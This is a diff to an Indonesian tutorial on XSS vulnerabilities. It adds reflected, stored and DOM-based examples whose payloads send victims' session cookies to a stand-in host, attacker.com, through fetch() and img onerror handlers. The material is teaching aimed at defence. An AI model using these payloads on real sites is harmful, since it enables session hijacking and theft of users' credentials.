@@ -19,71 +19,92 @@ Cross-Site Scripting (XSS) adalah jenis kerentanan keamanan pada aplikasi web, d
 1. Reflected XSS
 
 1. `Reflected XSS`
-```html
-URL:
-https://example.com/search?q=Nabil+Irawan+Top+4+WordFence
 
-Output:
-<div class="result">Hasil Pencarian dari: Nabil Irawan Top 4 WordFence</div>
+Sebuah aplikasi menampilkan pesan error kustom pada halaman login, di mana nama field yang gagal divalidasi ditampilkan kembali ke pengguna melalui parameter get bernama`field`.
+ 
+Request normal:
 ```
-
-Karena pada value dari parameter `q` tidak ada filter dan sanitasi, maka penyerang dengan mudah memanipulasinya seperti ini.
-
-```html
-URL:
-https://example.com/search?q=<script>/*+Malicious+Code+Here+*/</script>
-
-Output:
-<div class="result">Hasil Pencarian dari: <script>/*+Malicious+Code+Here+*/</script></div>
+https://example.com/login?field=email&error=required
 ```
+ 
+Output pada halaman:
+```html
+<div class="alert">Field "email" wajib diisi.</div>
+```
+ 
+Karena nilai parameter `field` langsung disisipkan ke dalam halaman tanpa filter maupun encoding, penyerang dapat mengganti nilai tersebut dengan payload berbahaya, lalu mengirimkan link ini kepada korban (misalnya melalui email phishing):
+ 
+```
+https://example.com/login?field=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>&error=required
+```
+ 
+Output pada halaman korban:
+```html
+<div class="alert">Field "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>" wajib diisi.</div>
+```
+ 
+Ketika korban membuka link tersebut, script akan langsung dieksekusi oleh browser korban dan mengirimkan cookie sesi korban ke server milik penyerang, yang berpotensi digunakan untuk melakukan session hijacking.
 
 2. Stored XSS
 
-2. `Stored XSS`
-```html
-Input:
-Best Alumni from BWI
-
-Output:
-<p>Hi, my name Nabil</p>
-<br>
-<p>Profile:</p>
-<br>
-<p>Best Alumni from BWI</p>
+Semisal kita punya fitur untuk menampilkan komentar2 pengguna suatu aplikasi dan salah satu pesan nya seperti ini
 ```
-
-Sebagai contoh terdapat sebuah fitur untuk melakukan edit profile, tanpa adanya filter dan sanitasi input pada form tersebut maka penyerang bisa menyisipkan kode seperti ini.
-
+Nopal Dapa gacor bug bounty $500 dolar!
+```
+ 
+Output yang ditampilkan ke semua pengunjung thread:
 ```html
-Input:
-<script>/*+Malicious+Code+Here+*/</script>
-
-Output:
-<p>Hi, my name Nabil</p>
-<br>
-<p>Profile:</p>
-<br>
-<p><script>/*+Malicious+Code+Here+*/</script></p>
+<div class="comment">
+    <span class="author">nopalngawixx</span>
+    <p>Nopal Dapa gacor bug bounty $500 dolar!</p>
+</div>
+```
+ 
+Karena tidak ada filter maupun sanitasi terhadap input komentar sebelum disimpan ke database, penyerang dapat mengirimkan komentar berisi payload berbahaya,
+Contohnya menggunakan atribut `onerror` pada tag HTML img
+ 
+```
+menarik iki bolo <img src="x" onerror="new Image().src='https://attacker.com/log?c='+document.cookie">
+```
+ 
+Output yang tersimpan dan ditampilkan ke setiap pengunjung saat mengunjungi halaman tersebut:
+```html
+<div class="comment">
+    <span class="author">hengkerhamdal89</span>
+    <p>menarik iki bolo <img src="x" onerror="new Image().src='https://attacker.com/log?c='+document.cookie"></p>
+</div>
 ```
 
 3. DOM-based XSS
 
+
+Misalkan ada sebuah halaman produk e-commerce menampilkan nama kategori yang sedang aktif menggunakan data dari fragment URL (`#`), 
+yang diproses sepenuhnya di sisi client tanpa dikirim ke server:
+ 
 ```js
-var urlParams = new URLSearchParams(window.location.search);
-var name = urlParams.get('name');
-document.getElementById('message').innerHTML = "Hello, " + name + "!";
+var hash = decodeURIComponent(window.location.hash.substring(1));
+document.getElementById('categoryLabel').innerHTML = "Kategori: " + hash;
 ```
 
-Karena tidak ada filter dan sanitasi pada kolom input, maka penyerang dengan mudah menyisipkan kode berbahaya.
-
+Dalam kasus request normal yang seharusnya dilakukan oleh pengguna:
+```
+https://example.com/products#Elektronik
+```
+ 
+Maka hasil render pada halaman akan menyesuaikan dengan query dari data fragment URL tersebut:
 ```html
-Input:
-http://example.com/page.html?name=<img src=1 onerror='/* Malicious Code Here */'>
-
-
-Output:
-<h1>Welcome!</h1>
-<p id="message"><img src=1 onerror='/* Malicious Code Here */'></p>
+<h2 id="categoryLabel">Kategori: Elektronik</h2>
+```
+ 
+Tapi, karena nilai `hash` diambil langsung dari URL dan disisipkan ke `innerHTML` tanpa sanitasi, penyerang dapat membuat link dengan payload berikut dan menyebarkannya kepada korban:
+ 
+```
+https://example.com/products#<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
+```
+ 
+Hasil render pada halaman korban:
+```html
+<h2 id="categoryLabel">Kategori: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)></h2>
 ```
 
 ## Mitigasi
